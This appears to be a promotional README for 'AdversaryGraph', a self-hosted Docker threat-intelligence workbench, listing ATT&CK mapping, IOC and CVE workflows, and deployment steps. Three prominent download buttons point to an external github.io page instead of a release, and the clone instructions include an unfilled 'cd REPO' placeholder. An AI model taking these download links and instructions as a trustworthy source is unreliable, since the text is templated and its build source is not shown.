# AdversaryGraph v6.1.0 - Cybersecurity Threat Intelligence Workbench 2026

> **AdversaryGraph is a self-hosted Docker web application for transforming threat intelligence into ATT&CK-aligned investigations, detection engineering, simulations, and validated defensive processes in version 6.1.0.**

[![Platform](https://img.shields.io/badge/Platform-Self--hosted%20Docker%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v6.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverctoojames4785/adversarygraph-threat-intel?style=flat-square)](https://github.com/oliverctoojames4785/adversarygraph-threat-intel)

---

<p align="center">
  <a href="https://oliverctoojames4785.github.io/adversarygraph-threat-intel/">
    <img src="https://img.shields.io/badge/Download-AdversaryGraph%20Latest-brightgreen?style=for-the-badge" alt="Download AdversaryGraph">
  </a>
</p>

> **[Download AdversaryGraph v6.1.0](https://oliverctoojames4785.github.io/adversarygraph-threat-intel/)**

---

[Download Latest Build](https://oliverctoojames4785.github.io/adversarygraph-threat-intel/)

---

## Overview

AdversaryGraph provides a cyber threat intelligence workbench for analysts, threat hunters, detection engineers, and broader security teams. Its workflows combine AI-assisted report ingestion with structured analysis for ATT&CK and ATLAS mappings, indicators of compromise, vulnerability intelligence, malware triage, and attack-surface investigation.

The self-hosted Docker deployment is designed to move teams from intelligence review to defensive action. Users can search evidence with hybrid RAG, produce ATT&CK Navigator overlays, assess detection coverage, perform attack-simulation workflows, and validate SIEM-focused use cases.

---

## Core Capabilities

- Use AI assistance to ingest, structure, and organize CTI reports.
- Associate intelligence findings with MITRE ATT&CK and ATLAS techniques.
- Track developing activity with Threat Radar early-warning workflows.
- Enrich indicators and investigate them through threat-hunting workflows.
- Connect CVE data with CISA KEV intelligence.
- Represent assets and their relationships across the attack surface.
- Support malware triage through structured analysis workflows.
- Build attack scenarios and assist with SIEM validation.
- Relate intelligence evidence to detections using the Evidence-to-Detection Graph.
- Search intelligence through a unified hybrid RAG experience.
- Generate ATT&CK Navigator overlays for investigation and reporting.
- Provide advisory data through a read-only MCP server.

---

## Deployment

AdversaryGraph runs as a self-hosted Docker web application.

1. Check out the repository:

   ```bash
   git clone https://github.com/oliverctoojames4785/adversarygraph-threat-intel.git
   cd REPO
   ```

2. Inspect the Docker Compose file and add the service settings required for your deployment.

3. Launch the services in the background:

   ```bash
   docker compose up -d
   ```

4. Visit the web interface using the address exposed by the Compose configuration.

For an existing deployment, pull the newest repository changes, check for configuration updates, and recreate the services with Docker Compose.

---

## Typical Workflow

A common investigation path may look like this:

1. Submit a CTI report for analyst processing.
2. Identify entities, IOCs, vulnerabilities, and adversary behavior.
3. Relate the observed techniques to ATT&CK or ATLAS.
4. Enrich and investigate IOCs together with associated CVE and CISA KEV data.
5. Examine impacted assets and their attack-surface connections.
6. Use the Evidence-to-Detection Graph to associate intelligence with detection opportunities.
7. Apply threat-hunting workflows, Navigator overlays, or attack simulations.
8. Test the resulting detection concepts through SIEM-oriented workflows.

When an advisory integration needs structured intelligence access, external clients can use the read-only MCP server.

---

## Deployment Configuration

Docker Compose and its related environment configuration control application settings.

```yaml
services:
  adversarygraph:
    environment:
      # Add deployment-specific settings here
      # Keep credentials and integration values outside version control
    ports:
      - "HOST_PORT:CONTAINER_PORT"
```

Set the values required by the chosen deployment before bringing up the stack. These may include service connections, external integrations, and AI or search options. The repository's Compose and environment examples document the available configuration settings.

---

## System Requirements

- Docker Engine that supports Docker Compose.
- A host with enough capacity to run the self-hosted web application and its configured services.
- Network connectivity suitable for CTI ingestion, enrichment, vulnerability intelligence, and optional integrations.
- Sufficient storage for reports, indexed material, investigation records, and application state.
- A supported web browser for the user interface.
- Credentials or API configuration for enabled external services.

---

## Frequently Asked Questions

### What teams can use AdversaryGraph?

AdversaryGraph is designed for threat intelligence analysts, threat hunters, detection engineers, incident-response teams, and security practitioners conducting ATT&CK-oriented investigations.

### What is the update process?

Pull the latest repository version, inspect any deployment changes, and recreate the Docker Compose services. Retain persistent data and local configuration while updating.

### How is the application configured?

Settings are provided through Docker Compose and associated environment configuration. Store secrets and integration credentials locally instead of adding them to version control.

### Does it support vulnerability investigations?

Yes. AdversaryGraph includes CVE intelligence, CISA KEV correlation, IOC investigation, and asset attack-surface mapping.

### What can I do if startup fails?

Check the Docker Compose output and container logs first. Then confirm that required configuration, ports, storage locations, and dependent services are available, and ensure the host has adequate resources for the selected deployment.

### Where can I obtain builds and updates?

Use the repository's current release or build workflow, or choose the latest available package from the download link above.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
